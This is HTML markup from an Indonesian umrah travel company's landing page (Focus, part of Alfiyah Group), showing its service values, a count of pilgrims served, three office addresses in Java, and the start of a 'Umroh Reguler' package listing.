<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9IjIzOCIgdmlld0JveD0iMCAwIDEwMjQgMjM4Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBzdHlsZT0iZmlsbDojY2ZkNGRiO2ZpbGwtb3BhY2l0eTogMC4xOyIvPjwvc3ZnPg==" decoding="async" fetchpriority="high" width="1024" height="238" data-src="{{ asset('/wp-content/uploads/2023/10/logo-alfiyah-putih-1024x238.png') }}" class="attachment-large size-large wp-image-1634" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/10/logo-alfiyah-putih-1024x238.png') }} 1024w, {{ asset('/wp-content/uploads/2023/10/logo-alfiyah-putih-300x70.png') }} 300w, {{ asset('/wp-content/uploads/2023/10/logo-alfiyah-putih-768x179.png') }} 768w, {{ asset('/wp-content/uploads/2023/10/logo-alfiyah-putih-1536x358.png') }} 1536w, {{ asset('/wp-content/uploads/2023/10/logo-alfiyah-putih.png') }} 1821w" data-sizes="(max-width: 1024px) 100vw, 1024px">
</div></div></div></div>
<div class="elementor-element elementor-element-79eab646 elementor-view-default elementor-invisible elementor-widget elementor-widget-icon" data-id="79eab646" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInDown&quot;}" data-widget_type="icon.default"><div class="elementor-widget-container"><div class="elementor-icon-wrapper">
<a class="elementor-icon elementor-animation-hang" href="#start">
<i aria-hidden="true" class="fas fa-arrow-down"></i>			</a>
</div></div></div>
</div></div>
<div class="elementor-column elementor-col-50 elementor-top-column elementor-element elementor-element-2ff6c3e9" data-id="2ff6c3e9" data-element_type="column"><div class="elementor-widget-wrap elementor-element-populated"><div class="elementor-element elementor-element-192b123b animated-slow elementor-widget__width-initial elementor-widget-mobile__width-initial elementor-invisible elementor-widget elementor-widget-image" data-id="192b123b" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;,&quot;_animation_delay&quot;:200,&quot;_animation_mobile&quot;:&quot;fadeIn&quot;}" data-widget_type="image.default"><div class="elementor-widget-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9IjEwMjQiIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHN0eWxlPSJmaWxsOiNjZmQ0ZGI7ZmlsbC1vcGFjaXR5OiAwLjE7Ii8+PC9zdmc+" decoding="async" width="1024" height="1024" data-src="{{ asset('/wp-content/uploads/2023/10/focus-headimage-1024x1024.png') }}" class="attachment-large size-large wp-image-1568" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/10/focus-headimage-1024x1024.png') }} 1024w, {{ asset('/wp-content/uploads/2023/10/focus-headimage-300x300.png') }} 300w, {{ asset('/wp-content/uploads/2023/10/focus-headimage-150x150.png') }} 150w, {{ asset('/wp-content/uploads/2023/10/focus-headimage-768x768.png') }} 768w, {{ asset('/wp-content/uploads/2023/10/elementor/thumbs/focus-headimage-qdm7gpyq0e79jnccpwzvf0ee3wvvwrn4fu7hb69gfk.png') }} 600w, {{ asset('/wp-content/uploads/2023/10/focus-headimage.png') }} 1300w" data-sizes="(max-width: 1024px) 100vw, 1024px">
</div></div></div></div>
</div></section><section class="elementor-section elementor-top-section elementor-element elementor-element-74df86c7 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="74df86c7" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;gradient&quot;}"><div class="elementor-background-overlay"></div>
<div class="elementor-container elementor-column-gap-default"><div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-63706b9f" data-id="63706b9f" data-element_type="column"><div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-element elementor-element-534006b elementor-widget elementor-widget-menu-anchor" data-id="534006b" data-element_type="widget" data-widget_type="menu-anchor.default"><div class="elementor-widget-container"><div id="start" class="elementor-menu-anchor"></div></div></div>
<div class="elementor-element elementor-element-111b2b5 elementor-widget elementor-widget-image" data-id="111b2b5" data-element_type="widget" data-widget_type="image.default"><div class="elementor-widget-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3NjgiIGhlaWdodD0iMjIyIiB2aWV3Qm94PSIwIDAgNzY4IDIyMiI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgc3R5bGU9ImZpbGw6I2NmZDRkYjtmaWxsLW9wYWNpdHk6IDAuMTsiLz48L3N2Zz4=" decoding="async" width="768" height="222" data-src="{{ asset('/wp-content/uploads/2023/09/focus-logo-rec-brown-768x222.png') }}" class="attachment-medium_large size-medium_large wp-image-1088" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/09/focus-logo-rec-brown-768x222.png') }} 768w, {{ asset('/wp-content/uploads/2023/09/focus-logo-rec-brown-300x87.png') }} 300w, {{ asset('/wp-content/uploads/2023/09/focus-logo-rec-brown-1024x296.png') }} 1024w, {{ asset('/wp-content/uploads/2023/09/focus-logo-rec-brown-1536x444.png') }} 1536w, {{ asset('/wp-content/uploads/2023/09/focus-logo-rec-brown-2048x592.png') }} 2048w" data-sizes="(max-width: 768px) 100vw, 768px">
</div></div>
<div class="elementor-element elementor-element-48c1db8 elementor-widget elementor-widget-heading" data-id="48c1db8" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default"><span style="background: linear-gradient(90deg, #6B5E56 20%, #8B7E74 50%); -webkit-background-clip: text;  -webkit-text-fill-color: transparent;"> we have</span></h2></div></div>
<div class="elementor-element elementor-element-3c89959 elementor-widget elementor-widget-sina_fancytext" data-id="3c89959" data-element_type="widget" data-widget_type="sina_fancytext.default"><div class="elementor-widget-container"><div class="sina-fancytext" data-fancy-text="Integrity@@Excellence@@Collaboration@@Innovation@@" data-anim="fadeIn" data-speed="" data-delay="5500" data-cursor="" data-loop=""><h3>
<span class="sina-fancytext-strings">
Integrity@@Excellence@@Collaboration@@Innovation					</span>
</h3></div></div></div>
<div class="elementor-element elementor-element-36d71d3 elementor-widget elementor-widget-sina_fancytext" data-id="36d71d3" data-element_type="widget" data-widget_type="sina_fancytext.default"><div class="elementor-widget-container"><div class="sina-fancytext" data-fancy-text="Meningkatkan pelayanan dengan mengutamakan 7S (Senyum, Sapa, Salam, Sopan, Santun, Semangat, Sepenuh Hati)@@Memberikan pelayanan dengan cepat, tanggap, dan tepat@@Mengedepankan nilai etika dan profesionalisme dalam semua interaksi dengan jamaah dan mitra kerja@@Meningkatkan kualitas SDM secara personal maupun team dalam segala kegiatan pelayanan@@" data-anim="fadeIn" data-speed="" data-delay="5500" data-cursor="" data-loop=""><h3>
<span class="sina-fancytext-strings">
Meningkatkan pelayanan dengan mengutamakan 7S (Senyum, Sapa, Salam, Sopan, Santun, Semangat, Sepenuh Hati)@@Memberikan pelayanan dengan cepat, tanggap, dan tepat@@Mengedepankan nilai etika dan profesionalisme dalam semua interaksi dengan jamaah dan mitra kerja@@Meningkatkan kualitas SDM secara personal maupun team dalam segala kegiatan pelayanan					</span>
</h3></div></div></div>
<section class="elementor-section elementor-inner-section elementor-element elementor-element-24a5305b elementor-section-content-top elementor-reverse-tablet elementor-section-height-min-height elementor-section-boxed elementor-section-height-default" data-id="24a5305b" data-element_type="section"><div class="elementor-container elementor-column-gap-wider">
<div id="tentangne" class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-1ae155e7" data-id="1ae155e7" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;background_motion_fx_motion_fx_scrolling&quot;:&quot;yes&quot;,&quot;background_motion_fx_translateY_effect&quot;:&quot;yes&quot;,&quot;background_motion_fx_translateY_speed&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:4,&quot;sizes&quot;:[]},&quot;background_motion_fx_translateY_affectedRange&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:{&quot;start&quot;:0,&quot;end&quot;:100}},&quot;background_motion_fx_devices&quot;:[&quot;desktop&quot;,&quot;tablet&quot;,&quot;mobile&quot;]}"><div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-background-overlay"></div>
<div class="elementor-element elementor-element-6037b9e elementor-invisible elementor-widget elementor-widget-image" data-id="6037b9e" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;bounceInUp&quot;}" data-widget_type="image.default"><div class="elementor-widget-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9IjEwMjQiIHZpZXdCb3g9IjAgMCAxMDI0IDEwMjQiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIHN0eWxlPSJmaWxsOiNjZmQ0ZGI7ZmlsbC1vcGFjaXR5OiAwLjE7Ii8+PC9zdmc+" decoding="async" width="1024" height="1024" data-src="{{ asset('/wp-content/uploads/2023/10/Untitled-design-3-1024x1024.png') }}" class="attachment-large size-large wp-image-1379" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/10/Untitled-design-3-1024x1024.png') }} 1024w, {{ asset('/wp-content/uploads/2023/10/Untitled-design-3-300x300.png') }} 300w, {{ asset('/wp-content/uploads/2023/10/Untitled-design-3-150x150.png') }} 150w, {{ asset('/wp-content/uploads/2023/10/Untitled-design-3-768x768.png') }} 768w, {{ asset('/wp-content/uploads/2023/10/elementor/thumbs/Untitled-design-3-qdbo9y7v6hbq85ukmsndv8h9q5sp1211asp41ge9v4.png') }} 600w, {{ asset('/wp-content/uploads/2023/10/Untitled-design-3.png') }} 1080w" data-sizes="(max-width: 1024px) 100vw, 1024px">
</div></div>
</div></div>
<div class="elementor-column elementor-col-50 elementor-inner-column elementor-element elementor-element-a7a369a" data-id="a7a369a" data-element_type="column" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;background_motion_fx_motion_fx_scrolling&quot;:&quot;yes&quot;,&quot;background_motion_fx_translateY_effect&quot;:&quot;yes&quot;,&quot;background_motion_fx_translateY_speed&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:4,&quot;sizes&quot;:[]},&quot;background_motion_fx_translateY_affectedRange&quot;:{&quot;unit&quot;:&quot;%&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:{&quot;start&quot;:0,&quot;end&quot;:100}},&quot;background_motion_fx_devices&quot;:[&quot;desktop&quot;,&quot;tablet&quot;,&quot;mobile&quot;]}"><div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-background-overlay"></div>
<div class="elementor-element elementor-element-d72694f frostedglass e-transform elementor-invisible elementor-widget elementor-widget-heading" data-id="d72694f" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;bounceInUp&quot;,&quot;_transform_scale_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:1.1,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_scale_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Berhasil memberikan pelayanan terbaik untuk</h2></div></div>
<div class="elementor-element elementor-element-498f660 elementor-widget elementor-widget-counter" data-id="498f660" data-element_type="widget" data-widget_type="counter.default"><div class="elementor-widget-container"><div class="elementor-counter">
<div class="elementor-counter-number-wrapper">
<span class="elementor-counter-number-prefix"></span>
<span class="elementor-counter-number" data-duration="2000" data-to-value="70000" data-from-value="0" data-delimiter=",">0</span>
<span class="elementor-counter-number-suffix">+ Jamaah</span>
</div>
<div class="elementor-counter-title">*data resmi Alfiyah Group tahun 1444H</div>
</div></div></div>
<div class="elementor-element elementor-element-93d4010 frostedglass elementor-invisible elementor-widget elementor-widget-text-editor" data-id="93d4010" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;bounceInUp&quot;}" data-widget_type="text-editor.default"><div class="elementor-widget-container"><p>Focus memprioitaskan pelayanan prima dengan jumlah tim yang banyak, fasilitas terlengkap yang meliputi kantor / posko di Jeddah, Madinah, dan Mekkah, kendaraan operasional yang mendukung kelancaran pelayanan, dan segenap crew yang selalu mempertahankan kinerjanya melalui SOP demi tercapainya Service Excellent &amp; Best Experience.</p></div></div>
</div></div>
</div></section><div class="elementor-element elementor-element-1f7dab5 elementor-widget elementor-widget-spacer" data-id="1f7dab5" data-element_type="widget" data-widget_type="spacer.default"><div class="elementor-widget-container"><div class="elementor-spacer"><div class="elementor-spacer-inner"></div></div></div></div>
</div></div></div></section><div class="elementor-element elementor-element-1d95a84 e-flex e-con-boxed e-con" data-id="1d95a84" data-element_type="container" data-settings="{&quot;shape_divider_top&quot;:&quot;triangle-asymmetrical&quot;,&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-shape elementor-shape-top" data-negative="false">
<svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 1000 100" preserveaspectratio="none">
<path class="elementor-shape-fill" d="M738,99l262-93V0H0v5.6L738,99z"></path>
</svg>
</div>
<div class="elementor-element elementor-element-8f12e21 e-flex e-con-boxed e-con" data-id="8f12e21" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-94cf3b0 elementor-widget elementor-widget-image" data-id="94cf3b0" data-element_type="widget" data-widget_type="image.default"><div class="elementor-widget-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNzAiIGhlaWdodD0iMTcwIiB2aWV3Qm94PSIwIDAgMTcwIDE3MCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgc3R5bGU9ImZpbGw6I2NmZDRkYjtmaWxsLW9wYWNpdHk6IDAuMTsiLz48L3N2Zz4=" decoding="async" width="170" height="170" data-src="{{ asset('/wp-content/uploads/2023/04/destination.png') }}" class="attachment-medium_large size-medium_large wp-image-26" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/04/destination.png') }} 170w, {{ asset('/wp-content/uploads/2023/04/destination-150x150.png') }} 150w" data-sizes="(max-width: 170px) 100vw, 170px">
</div></div>
<div class="elementor-element elementor-element-e017446 elementor-headline--style-rotate elementor-widget elementor-widget-animated-headline" data-id="e017446" data-element_type="widget" data-settings="{&quot;headline_style&quot;:&quot;rotate&quot;,&quot;animation_type&quot;:&quot;slide-down&quot;,&quot;rotating_text&quot;:&quot;Kapanpun\nDimanapun&quot;,&quot;loop&quot;:&quot;yes&quot;,&quot;rotate_iteration_delay&quot;:2500}" data-widget_type="animated-headline.default"><div class="elementor-widget-container"><h3 class="elementor-headline elementor-headline-animation-type-slide-down">
<span class="elementor-headline-plain-text elementor-headline-text-wrapper"><span style="background: linear-gradient(90deg, #6B5E56 20%, #8B7E74 50%); -webkit-background-clip: text;  -webkit-text-fill-color: transparent;"> Temukan Kami </span></span>
<span class="elementor-headline-dynamic-wrapper elementor-headline-text-wrapper">
<span class="elementor-headline-dynamic-text elementor-headline-text-active">
Kapanpun			</span>
<span class="elementor-headline-dynamic-text">
Dimanapun			</span>
</span>
</h3></div></div>
</div></div>
<div class="elementor-element elementor-element-76e32a8 elementor-widget elementor-widget-heading" data-id="76e32a8" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Kami hadir di 3 kota, lebih dekat dalam melayani jamaah</h2></div></div>
<div class="elementor-element elementor-element-8152922 e-flex e-con-boxed e-con" data-id="8152922" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-3b7c4e8 e-transform e-flex e-con-boxed e-con" data-id="3b7c4e8" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;gradient&quot;,&quot;_transform_translateY_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:-50,&quot;sizes&quot;:[]},&quot;content_width&quot;:&quot;boxed&quot;,&quot;_transform_translateX_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateX_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateX_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateY_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateY_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}"><div class="e-con-inner">
<div class="elementor-element elementor-element-ad33ea6 elementor-widget elementor-widget-image" data-id="ad33ea6" data-element_type="widget" data-widget_type="image.default"><div class="elementor-widget-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDI0IiBoZWlnaHQ9Ijg5MSIgdmlld0JveD0iMCAwIDEwMjQgODkxIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBzdHlsZT0iZmlsbDojY2ZkNGRiO2ZpbGwtb3BhY2l0eTogMC4xOyIvPjwvc3ZnPg==" decoding="async" width="1024" height="891" data-src="{{ asset('/wp-content/uploads/2023/10/peta-batanf-web-1024x891.png') }}" class="elementor-animation-float attachment-large size-large wp-image-1638" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/10/peta-batanf-web-1024x891.png') }} 1024w, {{ asset('/wp-content/uploads/2023/10/peta-batanf-web-300x261.png') }} 300w, {{ asset('/wp-content/uploads/2023/10/peta-batanf-web-768x668.png') }} 768w, {{ asset('/wp-content/uploads/2023/10/peta-batanf-web-1536x1337.png') }} 1536w, {{ asset('/wp-content/uploads/2023/10/peta-batanf-web-2048x1783.png') }} 2048w" data-sizes="(max-width: 1024px) 100vw, 1024px">
</div></div>
<div class="elementor-element elementor-element-ae4bf63 elementor-invisible elementor-widget elementor-widget-heading" data-id="ae4bf63" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;,&quot;_animation_delay&quot;:500}" data-widget_type="heading.default"><div class="elementor-widget-container"><h3 class="elementor-heading-title elementor-size-default">Batang</h3></div></div>
<div class="elementor-element elementor-element-8cfba91 elementor-invisible elementor-widget elementor-widget-heading" data-id="8cfba91" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;,&quot;_animation_delay&quot;:400}" data-widget_type="heading.default"><div class="elementor-widget-container"><h3 class="elementor-heading-title elementor-size-default">Jalan Blado - Pagilaran, Batang, Jawa Tengah 51255</h3></div></div>
</div></div>
<div class="elementor-element elementor-element-48000be e-transform e-flex e-con-boxed e-con" data-id="48000be" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;gradient&quot;,&quot;_transform_translateY_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:-50,&quot;sizes&quot;:[]},&quot;content_width&quot;:&quot;boxed&quot;,&quot;_transform_translateX_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateX_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateX_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateY_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateY_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}"><div class="e-con-inner">
<div class="elementor-element elementor-element-c106f6d elementor-widget elementor-widget-image" data-id="c106f6d" data-element_type="widget" data-widget_type="image.default"><div class="elementor-widget-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI3OTYiIGhlaWdodD0iMTAyNCIgdmlld0JveD0iMCAwIDc5NiAxMDI0Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBzdHlsZT0iZmlsbDojY2ZkNGRiO2ZpbGwtb3BhY2l0eTogMC4xOyIvPjwvc3ZnPg==" decoding="async" width="796" height="1024" data-src="{{ asset('/wp-content/uploads/2023/10/peta-pati-796x1024.png') }}" class="elementor-animation-float attachment-large size-large wp-image-1460" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/10/peta-pati-796x1024.png') }} 796w, {{ asset('/wp-content/uploads/2023/10/peta-pati-233x300.png') }} 233w, {{ asset('/wp-content/uploads/2023/10/peta-pati-768x988.png') }} 768w, {{ asset('/wp-content/uploads/2023/10/peta-pati-1194x1536.png') }} 1194w, {{ asset('/wp-content/uploads/2023/10/peta-pati-1592x2048.png') }} 1592w" data-sizes="(max-width: 796px) 100vw, 796px">
</div></div>
<div class="elementor-element elementor-element-d28ca8c elementor-invisible elementor-widget elementor-widget-heading" data-id="d28ca8c" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;,&quot;_animation_delay&quot;:500}" data-widget_type="heading.default"><div class="elementor-widget-container"><h3 class="elementor-heading-title elementor-size-default">Pati</h3></div></div>
<div class="elementor-element elementor-element-c51550b elementor-invisible elementor-widget elementor-widget-heading" data-id="c51550b" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;,&quot;_animation_delay&quot;:400}" data-widget_type="heading.default"><div class="elementor-widget-container"><h3 class="elementor-heading-title elementor-size-default">Karaban 04/05, Gabus, Pati, Jawa Tengah 59173</h3></div></div>
</div></div>
<div class="elementor-element elementor-element-ca79e8b e-transform e-flex e-con-boxed e-con" data-id="ca79e8b" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;gradient&quot;,&quot;_transform_translateY_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:-50,&quot;sizes&quot;:[]},&quot;content_width&quot;:&quot;boxed&quot;,&quot;_transform_translateX_effect_hover&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateX_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateX_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateY_effect_hover_tablet&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]},&quot;_transform_translateY_effect_hover_mobile&quot;:{&quot;unit&quot;:&quot;px&quot;,&quot;size&quot;:&quot;&quot;,&quot;sizes&quot;:[]}}"><div class="e-con-inner">
<div class="elementor-element elementor-element-aac4df9 elementor-widget elementor-widget-image" data-id="aac4df9" data-element_type="widget" data-widget_type="image.default"><div class="elementor-widget-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5MjQiIGhlaWdodD0iMTAyNCIgdmlld0JveD0iMCAwIDkyNCAxMDI0Ij48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBzdHlsZT0iZmlsbDojY2ZkNGRiO2ZpbGwtb3BhY2l0eTogMC4xOyIvPjwvc3ZnPg==" decoding="async" width="924" height="1024" data-src="{{ asset('/wp-content/uploads/2023/10/malang-924x1024.png') }}" class="elementor-animation-float attachment-large size-large wp-image-1413" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/10/malang-924x1024.png') }} 924w, {{ asset('/wp-content/uploads/2023/10/malang-271x300.png') }} 271w, {{ asset('/wp-content/uploads/2023/10/malang-768x851.png') }} 768w, {{ asset('/wp-content/uploads/2023/10/malang-1387x1536.png') }} 1387w, {{ asset('/wp-content/uploads/2023/10/malang-1849x2048.png') }} 1849w, {{ asset('/wp-content/uploads/2023/10/malang.png') }} 1903w" data-sizes="(max-width: 924px) 100vw, 924px">
</div></div>
<div class="elementor-element elementor-element-d788316 elementor-invisible elementor-widget elementor-widget-heading" data-id="d788316" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;,&quot;_animation_delay&quot;:500}" data-widget_type="heading.default"><div class="elementor-widget-container"><h3 class="elementor-heading-title elementor-size-default">Malang</h3></div></div>
<div id="layanan" class="elementor-element elementor-element-687f4e2 elementor-invisible elementor-widget elementor-widget-heading" data-id="687f4e2" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;fadeInUp&quot;,&quot;_animation_delay&quot;:400}" data-widget_type="heading.default"><div class="elementor-widget-container"><h3 class="elementor-heading-title elementor-size-default">Jalan Soekarno Hatta, Kota Malang, Jawa Timur 65142</h3></div></div>
</div></div>
</div></div>
</div></div>
<section class="elementor-section elementor-top-section elementor-element elementor-element-2ee84502 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="2ee84502" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}" style="z-index: 60;"><div class="elementor-background-overlay"></div>
<div class="elementor-container elementor-column-gap-default"><div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-15a347fd frostedglass elementor-invisible" data-id="15a347fd" data-element_type="column" data-settings="{&quot;animation&quot;:&quot;fadeInUp&quot;,&quot;animation_delay&quot;:300,&quot;background_background&quot;:&quot;gradient&quot;}"><div class="elementor-widget-wrap elementor-element-populated">
<div class="elementor-background-overlay"></div>
<div class="elementor-element elementor-element-733ba29 elementor-widget elementor-widget-heading" data-id="733ba29" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default"><span style="background: linear-gradient(90deg, #6B5E56 20%, #8B7E74 50%); -webkit-background-clip: text;  -webkit-text-fill-color: transparent;"> Rekomendasi</span></h2></div></div>
<div class="elementor-element elementor-element-cb166d9 elementor-widget elementor-widget-spacer" data-id="cb166d9" data-element_type="widget" data-widget_type="spacer.default"><div class="elementor-widget-container"><div class="elementor-spacer"><div class="elementor-spacer-inner"></div></div></div></div>
<div class="elementor-element elementor-element-7a95c28 e-flex e-con-boxed e-con" data-id="7a95c28" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-aa96930 e-flex e-con-boxed e-con" data-id="aa96930" data-element_type="container" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-19c98b9 elementor-widget elementor-widget-image" data-id="19c98b9" data-element_type="widget" data-widget_type="image.default"><div class="elementor-widget-container">
<img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0ODAiIGhlaWdodD0iNjQwIiB2aWV3Qm94PSIwIDAgNDgwIDY0MCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgc3R5bGU9ImZpbGw6I2NmZDRkYjtmaWxsLW9wYWNpdHk6IDAuMTsiLz48L3N2Zz4=" decoding="async" width="480" height="640" data-src="{{ asset('/wp-content/uploads/2023/10/IMG_3325.jpg') }}" class="attachment-large size-large wp-image-1562" alt="" data-srcset="{{ asset('/wp-content/uploads/2023/10/IMG_3325.jpg') }} 480w, {{ asset('/wp-content/uploads/2023/10/IMG_3325-225x300.jpg') }} 225w" data-sizes="(max-width: 480px) 100vw, 480px">
</div></div>
<div class="elementor-element elementor-element-3394230 elementor-widget elementor-widget-heading" data-id="3394230" data-element_type="widget" data-widget_type="heading.default"><div class="elementor-widget-container"><h2 class="elementor-heading-title elementor-size-default">Umroh<br>Reguler</h2></div></div>
<div class="elementor-element elementor-element-c47205d e-flex e-con-boxed e-con" data-id="c47205d" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
<div class="elementor-element elementor-element-f740c00 e-flex e-con-boxed e-con" data-id="f740c00" data-element_type="container" data-settings="{&quot;content_width&quot;:&quot;boxed&quot;}"><div class="e-con-inner">
